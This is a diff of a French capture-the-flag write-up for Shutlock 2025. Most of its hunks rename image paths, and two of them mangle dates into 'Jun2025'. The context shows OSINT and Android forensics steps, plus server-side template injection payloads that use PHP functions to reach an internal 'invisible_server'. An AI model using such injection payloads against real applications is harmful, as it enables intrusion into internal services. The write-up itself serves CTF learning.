@@ -17,7 +17,7 @@ Sur Reddit elle explique qu'on peut voir qui nous a partage une vidéo sur tikto
 
 On passe donc chrome en mode mobile et on visite son lien tiktok posté sur blueskye : vm.tiktok.com/ZNdjwpCF4/
 
-.. figure:: ../_static/img/shutlock-2025/shutlock_1.png
+.. figure:: ../_static/img/shutlock2025/shutlock_1.png
     :alt: Compte Tiktok
     :align: center
     :width: 1200
@@ -26,7 +26,7 @@ On retrouve alors son compte Tiktok et ses publications.
 
 Dans l'une d'elle on peut retrouver le flag : https://www.tiktok.com/@lestudiodutux/video/7500242847291968790 
 
-.. figure:: ../_static/img/shutlock-2025/shutlock_2.png
+.. figure:: ../_static/img/shutlock2025/shutlock_2.png
     :alt: Compte Tiktok
     :align: center
     :width: 1200
@@ -116,10 +116,10 @@ On va donc essayer de contacter ce serveur avec la SSTI :
     {{file_get_contents('http://invisible_server/')}} ==> 403 
     {{file_get_contents('https://invisible_server/')}} ==> Connection refused
     {{fopen("http://invisible_server/", "r");}} ==> 403 
-    {{print_r(get_headers("http://invisible_server/", 1))}} ==> Array ( [0] => HTTP/1.1 403 Forbidden [Date] => Thu, 26 Jun 2025 15:46:19 GMT [Server] => Apache/2.4.62 (Debian) [Content-Length] => 281 [Connection] => close [Content-Type] => text/html; charset=iso-8859-1 )
+    {{print_r(get_headers("http://invisible_server/", 1))}} ==> Array ( [0] => HTTP/1.1 403 Forbidden [Date] => Thu, 26 Jun2025 15:46:19 GMT [Server] => Apache/2.4.62 (Debian) [Content-Length] => 281 [Connection] => close [Content-Type] => text/html; charset=iso-8859-1 )
     {{ curl_exec(curl_init("http://invisible_server/")) }} ==> 403 mais affiche la page
     {{fopen("http://invisible_server/%20/", "r");}} ==> Resource id #3
-    {{print_r(get_headers("http://invisible_server/%20/", 1))}} ==> Array ( [0] => HTTP/1.1 200 OK [Date] => Thu, 26 Jun 2025 16:16:06 GMT [Server] => Apache/2.4.62 (Debian) [X-Powered-By] => PHP/8.2.28 [Content-Length] => 60 [Connection] => close [Content-Type] => text/html; charset=UTF-8 )
+    {{print_r(get_headers("http://invisible_server/%20/", 1))}} ==> Array ( [0] => HTTP/1.1 200 OK [Date] => Thu, 26 Jun2025 16:16:06 GMT [Server] => Apache/2.4.62 (Debian) [X-Powered-By] => PHP/8.2.28 [Content-Length] => 60 [Connection] => close [Content-Type] => text/html; charset=UTF-8 )
 
     {{ curl_exec(curl_init("http://invisible_server/%20/")) }} ==> La route demandée n’est pas correcte ou est indisponible
     
@@ -172,7 +172,7 @@ Osint - Find The Lab
 
 Il faut retrouver le lieu de la photo prise :
 
-.. figure:: ../_static/img/shutlock-2025/lab.png
+.. figure:: ../_static/img/shutlock2025/lab.png
     :alt: ALEAPP
     :align: center
     :width: 1200
@@ -278,7 +278,7 @@ Celui ci va nous pondre un petit rapport bien sympas !
 
 Dans la partie Google Message on va trouver ceci : 
 
-.. figure:: ../_static/img/shutlock-2025/aleapp.png
+.. figure:: ../_static/img/shutlock2025/aleapp.png
     :alt: ALEAPP
     :align: center
     :width: 1200
@@ -291,12 +291,12 @@ On obtient alors cette clé qui nous permet d'ouvrir le Keepass :
 
 Pour info on le trouve aussi ici dans l'image : 
 
-.. figure:: ../_static/img/shutlock-2025/aleapp2.png
+.. figure:: ../_static/img/shutlock2025/aleapp2.png
     :alt: ALEAPP
     :align: center
     :width: 1200
 
-.. figure:: ../_static/img/shutlock-2025/aleapp3.jpg
+.. figure:: ../_static/img/shutlock2025/aleapp3.jpg
     :alt: ALEAPP
     :align: center
     :width: 1200
@@ -313,7 +313,7 @@ On peut voir qu'il y a des fichiers "attachments" dans le keepass sur l'entrée.
 
 On va les récupérer : 
 
-.. figure:: ../_static/img/shutlock-2025/boardpass.png
+.. figure:: ../_static/img/shutlock2025/boardpass.png
     :alt: BoardPass
     :align: center
     :width: 1200
@@ -322,7 +322,7 @@ On a son identité, mais a priori ce n'est pas le flag.
 
 Finalement on trouve notre flag : 
 
-.. figure:: ../_static/img/shutlock-2025/idcard.png
+.. figure:: ../_static/img/shutlock2025/idcard.png
     :alt: ID Card
     :align: center
     :width: 1200
